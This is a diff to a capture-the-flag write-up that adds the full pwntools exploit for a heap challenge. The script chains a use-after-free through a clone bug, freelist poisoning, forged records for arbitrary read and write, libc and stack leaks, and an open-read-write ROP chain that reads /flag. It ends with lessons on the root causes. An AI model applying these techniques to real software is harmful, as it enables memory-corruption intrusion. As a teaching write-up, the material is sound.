@@ -168,7 +168,109 @@ python3 exploit.py          # locally using the shipped ld/libc
 
 ---
 
-## 6. Lessons (why these bugs happened)
+## 6. The full exploit script
+
+Here's the complete `exploit.py` that automates every step above. Read it alongside sections 4–5 — the comments line up with those phases.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import sys
+context.arch='amd64'; context.log_level='error'
+D='/home/kali/Desktop/pwn7/slab-vault/deliverable-user'
+LIBC=ELF(D+'/libc.so.6',checksec=False)
+REMOTE = len(sys.argv)>1 and sys.argv[1]=='remote'
+def start():
+    if REMOTE: return remote('172.16.38.22',1337)
+    return process([D+'/ld-linux-x86-64.so.2','--library-path',D,D+'/challenge'])
+io=start()
+def menu(c): io.recvuntil(b'> '); io.sendline(str(c).encode())
+def create(idx,size,title=b'A'*12):
+    menu(1); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode())
+    io.recvuntil(b'Size'); io.sendline(str(size).encode())
+    io.recvuntil(b'Title'); io.send(title[:12].ljust(12,b'A')+b'\n'); io.recvuntil(b'!')
+def edit(idx,data):
+    menu(2); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode())
+    io.recvuntil(b'bytes): '); io.send(data)   # must be exactly record.size bytes
+def view_raw(idx,n):
+    menu(3); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode())
+    io.recvuntil(b'Data: '); return io.recv(n)
+def delete(idx):
+    menu(4); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode()); io.recvuntil(b'!')
+def clone(s,d):
+    menu(5); io.recvuntil(b'Source index (0-15): '); io.sendline(str(s).encode())
+    io.recvuntil(b'Destination index (0-15): '); io.sendline(str(d).encode()); io.recvuntil(b'!')
+
+# ---- 1) PIE leak via title+fptr in view ----
+create(0,0x28, b'A'*12)
+menu(3); io.recvuntil(b'0-15): '); io.sendline(b'0')
+io.recvuntil(b'Title: '); line=io.recvuntil(b'\n',drop=True)
+fptr=u64(line[12:].ljust(8,b'\0')); pie=fptr-0x1720
+log.warning(f"PIE=%#x", pie)
+delete(0)
+RA=pie+0x5060
+rec14=RA+14*0x28    # forged handle
+# ---- 2) poison (class 0x80, size 0x28) -> master record6.data = rec14 ----
+create(0,0x28); create(1,0x28)
+clone(0,2); clone(1,3)
+delete(1); delete(0)
+edit(2, p64(rec14-8).ljust(0x28,b'\x00'))   # chunk0.next = rec14-8 (edit writes size=0x28 bytes)
+create(4,0x28)                               # pop chunk0
+create(6,0x28)                               # pop rec14-8 -> record6.data = rec14
+# record6.size is 0x28; edit(6) writes 0x28 bytes = forge record14
+def forge14(addr,size,fptr14=0):
+    edit(6, p32(1)+b'AAAAAAAAAAAA'[:12]+p64(fptr14)+p64(size)+p64(addr))
+def arb_read(addr,n):
+    forge14(addr,n); return view_raw(14,n)
+def arb_write(addr,data):
+    forge14(addr,len(data)); edit(14,data)
+
+# ---- 3) libc via stdout copy at pie+0x5020 ----
+libc_leak=u64(arb_read(pie+0x5020,8)[:8])
+libc=libc_leak-0x21b780
+log.warning("libc=%#x", libc)
+# ---- 4) stack via environ ----
+stack_env=u64(arb_read(libc+0x222200,8)[:8])
+log.warning("environ->stack=%#x", stack_env)
+# ---- 5) find handler ret slot (holds pie+0x15d5 during view) ----
+WIN=0x800
+base=stack_env-WIN
+blk=arb_read(base,WIN)
+target_val=pie+0x15d5
+slot=None
+for off in range(0,len(blk)-8,8):
+    if u64(blk[off:off+8])==target_val:
+        slot=base+off  # last match = most recent frame (deepest? highest addr)
+log.warning("handler_ret_slot=%#x", slot if slot else 0)
+if slot is None:
+    log.error("ret slot not found; dump:")
+    for off in range(0,len(blk),8):
+        v=u64(blk[off:off+8])
+        if pie<=v<pie+0x8000: print(hex(base+off),hex(v),"PIE+",hex(v-pie))
+    io.interactive()
+# ---- 6) build ORW ROP at slot ----
+pop_rdi=libc+0x2a3e5; pop_rsi=libc+0x2be51; pop_rdx_rbx=libc+0x90469
+pop_rax=libc+0x45eb0; syscall=libc+0x912d6
+flag_addr=slot+0x100; buf=slot+0x180
+chain=flat(
+ pop_rdi, flag_addr, pop_rsi, 0, pop_rdx_rbx, 0,0, pop_rax,2, syscall,
+ pop_rdi, 3, pop_rsi, buf, pop_rdx_rbx, 0x100,0, pop_rax,0, syscall,
+ pop_rdi, 1, pop_rsi, buf, pop_rdx_rbx, 0x100,0, pop_rax,1, syscall,
+)
+payload=chain.ljust(0x100,b'\x00')+b'/flag\x00\x00\x00'+b'\x00'*(0x180-0x100-8)+b'\x00'*8
+payload=payload[:0x200]
+# write payload at slot (edit(14) as the trigger: its own ret is slot -> ROP after)
+arb_write(slot,payload)
+# after edit(14) returns via puts, ROP runs
+out=io.recvall(timeout=5)
+print(out.decode('latin1'))
+m=re.search(rb'bcsctf\{[^}]*\}?',out)
+if m: print("FLAG:",m.group().decode())
+```
+
+---
+
+## 7. Lessons (why these bugs happened)
 
 - **Never copy an owning pointer wholesale.** `Clone` duplicated the `data` pointer, so two records owned one buffer → aliasing, UAF, double-free. Fix: deep-copy the buffer, or refuse to clone live data.
 - **Storing freelist links inside user data + a UAF = freelist poisoning.** Once an attacker controls a freed chunk's `next`, they control future allocations → arbitrary allocation → arbitrary read/write. Fix: keep allocator metadata out of user-writable memory, and detect double-frees.
